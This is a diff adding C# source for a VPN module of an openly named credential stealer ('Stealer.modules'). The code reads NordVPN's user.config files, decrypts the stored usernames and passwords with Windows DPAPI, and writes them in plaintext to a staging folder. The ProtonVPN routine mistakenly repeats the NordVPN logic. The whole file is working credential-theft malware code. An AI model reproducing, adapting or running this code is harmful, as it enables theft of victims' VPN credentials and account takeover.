@@ -1,0 +1,143 @@
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Xml;
+
+namespace Stealer.modules
+{
+    internal class VPNClient
+    {
+        public static void GetVPN()
+        {
+            NordVPN();
+            ProtonVPN();
+        }
+
+        public static void NordVPN()
+        {
+			string str1 = Program.path;
+            string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string NordVPNDir = "\\VPN\\NordVPN";
+
+            try
+            {
+                if (!Directory.Exists(LocalData + "\\NordVPN\\"))
+                {
+                    return;
+
+                }
+                else
+                {
+                    Directory.CreateDirectory(str1 + NordVPNDir);
+
+
+                }
+
+                using (StreamWriter streamWriter = new StreamWriter(str1 + NordVPNDir + "\\Passwords.txt"))
+                {
+                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(LocalData, "NordVPN"));
+                    if (directoryInfo.Exists)
+                    {
+
+                        DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
+                        for (int i = 0; i < directories.Length; i++)
+                        {
+
+                            foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
+                            {
+
+                                string text = Path.Combine(directoryInfo2.FullName, "user.config");
+                                if (File.Exists(text))
+                                {
+                                    XmlDocument xmlDocument = new XmlDocument();
+                                    xmlDocument.Load(text);
+                                    string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
+                                    string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
+                                    if (innerText != null && !string.IsNullOrEmpty(innerText))
+                                    {
+                                        streamWriter.Write("\n[PASSWORD]\n");
+                                        streamWriter.WriteLine("Username: " + Nord_Vpn_Decoder(innerText));
+                                    }
+                                    if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
+                                    {
+                                        streamWriter.WriteLine("Password: " + Nord_Vpn_Decoder(innerText2));
+                                    }
+                                }
+                            }
+                        }
+
+                    }
+                }
+            }
+            catch { }
+
+        }
+
+        public static void ProtonVPN()
+        {
+            string str2 = Program.path;
+            string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            try
+            {
+                if (!Directory.Exists(LocalData + "\\ProtonVPN\\"))
+                {
+                    return;
+                }
+                else
+                {
+                    Directory.CreateDirectory(str2 + "\\VPN\\ProtonVPN\\");
+                }
+
+                using (StreamWriter streamWriter = new StreamWriter(str2 + "\\VPN\\ProtonVPN\\Passwords.txt"))
+                {
+                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(LocalData, "NordVPN"));
+                    if (directoryInfo.Exists)
+                    {
+                        DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
+                        for (int i = 0; i < directories.Length; i++)
+                        {
+
+                            foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
+                            {
+                                string text = Path.Combine(directoryInfo2.FullName, "user.config");
+                                if (File.Exists(text))
+                                {
+                                    XmlDocument xmlDocument = new XmlDocument();
+                                    xmlDocument.Load(text);
+                                    string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
+                                    string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
+                                    if (innerText != null && !string.IsNullOrEmpty(innerText))
+                                    {
+                                        streamWriter.Write("\n[PASSWORD]\n");
+                                        streamWriter.WriteLine("Username: " + Nord_Vpn_Decoder(innerText));
+                                    }
+                                    if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
+                                    {
+                                        streamWriter.WriteLine("Password: " + Nord_Vpn_Decoder(innerText2));
+                                    }
+                                }
+                            }
+                        }
+
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static string Nord_Vpn_Decoder(string s)
+        {
+            string result;
+            try
+            {
+                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
+            }
+            catch
+            {
+                result = "";
+            }
+            return result;
+        }
+    }
+}
